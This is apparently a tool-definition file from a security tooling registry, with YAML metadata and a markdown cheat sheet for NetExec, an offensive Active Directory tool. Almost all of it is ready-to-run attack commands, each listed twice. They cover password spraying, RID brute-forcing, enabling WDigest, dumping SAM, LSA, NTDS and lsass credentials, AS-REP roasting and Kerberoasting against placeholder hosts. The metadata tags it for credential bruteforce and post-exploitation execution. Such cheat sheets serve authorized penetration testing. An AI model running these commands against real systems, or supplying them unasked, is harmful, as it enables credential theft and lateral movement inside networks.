---
trust_level: community
id: darkiros-netexec
namespace: darkiros:tool:netexec
name: "NetExec"
description: "NetExec - enumerate hosts, network"
version: "1.0.0"
capabilities:
  - credential.bruteforce.spray
  - credential.discovery.reconnaissance
  - network.connect.remote
  - security.execution.post-exploitation
platforms:
  - cross-platform
techniques:
  - credential-access
  - discovery
  - execution
  - lateral-movement
execution:
  template: "netexec"
  sandbox: execFile
  timeout_seconds: 30
  shell: false
examples:
  - description: "NetExec - enumerate hosts, network"
    command: "nxc smb [ip_range]"
  - description: "NetExec - enumerate password policy"
    command: "nxc smb 10.10.10.161 -u '[user]' -p '[password]' --pass-pol"
  - description: "NetExec - enumerate null session"
    command: "nxc smb [ip] -u '' -p ''"
  - description: "NetExec - enumerate anonymouse login"
    command: "nxc smb [ip] -u 'a' -p ''"
  - description: "NetExec - enumerate active session"
    command: "nxc smb [ip] -u '[user]' -p '[password]' --sessions"
  - description: "NetExec - enumerate domain users"
    command: "nxc smb [ip] -u '[user]' -p '[password]' --users"
  - description: "NetExec - enumerate users by bruteforce the RID"
    command: "nxc smb [ip] -u '[user]' -p '[password]' --rid-brute"
  - description: "NetExec - enumerate domain groups"
    command: "nxc smb [ip] -u '[user]' -p '[password]' --groups"
  - description: "NetExec - enumerate local groups"
    command: "nxc smb [ip] -u '[user]' -p '[password]' --local-groups"
  - description: "NetExec - enumerate shares"
    command: "nxc smb [ip] -u '[user]' -p '[password]' --shares"
  - description: "NetExec - enumerate disks"
    command: "nxc smb [ip] -u '[user]' -p '[password]' --disks"
  - description: "NetExec - enumerate smb target not signed"
    command: "nxc smb [ip] --gen-relay-list [smb_targets.txt]"
  - description: "NetExec - enumerate logged users"
    command: "nxc smb [ip] -u '[user]' -p '[password]' --loggedon-users"
  - description: "NetExec - enable wdigest"
    command: "nxc smb [ip] -u '[user|Administrator]' -p '[password]' --local-auth --wdigest enable"
  - description: "NetExec - kerberos auth"
    command: "nxc smb [ip] --kerberos"
  - description: "NetExec - dump SAM"
    command: "nxc smb [ip] -u '[user]' -p '[password]' -d [domain] --sam"
  - description: "NetExec - dump LSA"
    command: "nxc smb [ip] -u '[user]' -p '[password]' -d [domain] --lsa"
  - description: "NetExec - dump NTDS"
    command: "nxc smb [ip] -u '[user]' -p '[password]' -d [domain] --ntds"
  - description: "NetExec - dump lsass"
    command: "nxc smb [ip] -u '[user]' -p '[password]' -d [domain] -M lsassy"
  - description: "NetExec - password spray (user=password)"
    command: "nxc smb [dc-ip] -u [user.txt] -p [password.txt] --no-bruteforce --continue-on-success"
  - description: "NetExec - password spray multiple test"
    command: "nxc smb [dc-ip] -u [user.txt] -p [password.txt] --continue-on-success"
  - description: "NetExec - ASREP Roasting enum whitout authentication"
    command: "nxc ldap [dc-ip] -u [user|user.txt] -p '' --asreproast output.txt"
  - description: "NetExec - Kerberoasting"
    command: "nxc ldap [dc-ip] -u [user] -p [password] --kerberoasting output.txt"
  - description: "NetExec - Unconstrained delegation"
    command: "nxc ldap [dc-ip] -u [user] -p [password] --trusted-for-delegation"
references:
  - label: "Source"
    url: "https://github.com/Pennyw0rth/NetExec"
  - label: "Darkiros"
    url: "https://darkiros.github.io/commands.html"
items:
  - NoCreds
  - Hash
  - Password
services:
  - SMB
  - Kerberos
  - LDAP
  - WinRM
---

# NetExec

Darkiros cheat sheet commands:

**NetExec - enumerate hosts, network**
```
nxc smb [ip_range]
```

**NetExec - enumerate password policy**
```
nxc smb 10.10.10.161 -u '[user]' -p '[password]' --pass-pol
```

**NetExec - enumerate null session**
```
nxc smb [ip] -u '' -p ''
```

**NetExec - enumerate anonymouse login**
```
nxc smb [ip] -u 'a' -p ''
```

**NetExec - enumerate active session**
```
nxc smb [ip] -u '[user]' -p '[password]' --sessions
```

**NetExec - enumerate domain users**
```
nxc smb [ip] -u '[user]' -p '[password]' --users
```

**NetExec - enumerate users by bruteforce the RID**
```
nxc smb [ip] -u '[user]' -p '[password]' --rid-brute
```

**NetExec - enumerate domain groups**
```
nxc smb [ip] -u '[user]' -p '[password]' --groups
```

**NetExec - enumerate local groups**
```
nxc smb [ip] -u '[user]' -p '[password]' --local-groups
```

**NetExec - enumerate shares**
```
nxc smb [ip] -u '[user]' -p '[password]' --shares
```

**NetExec - enumerate disks**
```
nxc smb [ip] -u '[user]' -p '[password]' --disks
```

**NetExec - enumerate smb target not signed**
```
nxc smb [ip] --gen-relay-list [smb_targets.txt]
```

**NetExec - enumerate logged users**
```
nxc smb [ip] -u '[user]' -p '[password]' --loggedon-users
```

**NetExec - enable wdigest**
```
nxc smb [ip] -u '[user|Administrator]' -p '[password]' --local-auth --wdigest enable
```

**NetExec - kerberos auth**
```
nxc smb [ip] --kerberos
```

**NetExec - dump SAM**
```
nxc smb [ip] -u '[user]' -p '[password]' -d [domain] --sam
```

**NetExec - dump LSA**
```
nxc smb [ip] -u '[user]' -p '[password]' -d [domain] --lsa
```

**NetExec - dump NTDS**
```
nxc smb [ip] -u '[user]' -p '[password]' -d [domain] --ntds
```

**NetExec - dump lsass**
```
nxc smb [ip] -u '[user]' -p '[password]' -d [domain] -M lsassy
```

**NetExec - password spray (user=password)**
```
nxc smb [dc-ip] -u [user.txt] -p [password.txt] --no-bruteforce --continue-on-success
```

**NetExec - password spray multiple test**
```
nxc smb [dc-ip] -u [user.txt] -p [password.txt] --continue-on-success
```

**NetExec - ASREP Roasting enum whitout authentication**
```
nxc ldap [dc-ip] -u [user|user.txt] -p '' --asreproast output.txt
```

**NetExec - Kerberoasting**
```
nxc ldap [dc-ip] -u [user] -p [password] --kerberoasting output.txt
```

**NetExec - Unconstrained delegation**
```
nxc ldap [dc-ip] -u [user] -p [password] --trusted-for-delegation
```
